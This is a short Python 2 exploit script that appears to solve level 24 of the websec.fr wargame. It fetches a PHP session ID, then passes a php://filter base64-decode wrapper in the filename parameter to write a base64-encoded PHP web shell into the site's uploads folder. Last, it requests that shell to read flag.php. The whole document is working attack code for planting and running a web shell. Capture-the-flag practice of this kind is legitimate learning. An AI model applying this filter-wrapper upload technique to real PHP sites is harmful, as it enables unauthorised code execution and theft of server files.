#!/usr/bin/python
# coding: utf-8

from requests import *
import base64

filename = 'ch4n3.php'

def get_session(s):
    s.get('http://websec.fr/level24/index.php')
    phpsessid = s.cookies.get_dict()['PHPSESSID']
    print "[*] your PHPSESSID is {0}".format(phpsessid)
    return phpsessid

def webshellContent():
    return "<?php echo file_get_contents('../../flag.php'); ?>"

def upload_webshell(s):
    exploit = 'php://filter/convert.base64-decode/resource={0}'.format(filename)
    url = 'http://websec.fr/level24/index.php?p=edit&filename={0}'.format(exploit)
    data = {
        'filename': exploit,
        'data': base64.b64encode(webshellContent())
    }

    s.post(url, data=data)

def execute_webshell(s, phpsessid):
    url = 'http://websec.fr/level24/uploads/{0}/{1}'.format(phpsessid, filename)
    r = s.get(url)
    print r.text

def main():
    s = Session()
    phpsessid = get_session(s)
    upload_webshell(s)
    execute_webshell(s, phpsessid)

if __name__ == '__main__':
    main()
